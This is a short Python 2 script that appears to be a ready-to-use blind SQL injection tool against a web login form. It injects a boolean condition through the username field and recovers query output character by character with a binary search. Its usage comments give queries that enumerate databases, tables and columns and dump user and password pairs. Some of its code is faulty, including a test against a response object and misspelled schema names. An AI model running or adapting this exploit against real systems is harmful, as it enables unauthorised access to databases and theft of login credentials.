# usage
#python blind-sql.py "query"
#list db "select group_concat(schema_name) from information_schema.schemata limit 1"
#list tabels "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
#list columns "select group_concat(colum_name) from information_schema.column where table_name='tablename' limit 1"
#dump columns "select group_concat(user,pass) from login limit 1"

import requests
import sys

base_url = "URL_TO_DO"
session = requests.Session()
true = "SERVER_RESPONSE"

def send_data(url, data):
    return session.post(format(url), data)

def condition(cond):

    payload = "admin' and %s#" % cond
    res = send_data(base_url,{"username":payload, "password": " " ,"submit":"Login"}) #parameter of the request
    return true in res

def sqli(sql):
    result = ""

    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 8):
                testchar = (range_high+range_low)/2
                res = condition("ascii(substr((%s), %d, 1))>=%d" % (sql, len(result)+1, testchar))
                if res:
                        range_low = testchar
                else:
                        range_high = testchar

        if testchar == 0:
                break;

        result += chr(testchar)

        print "Result: %s" % result

    return result

print sqli(sys.argv[1])
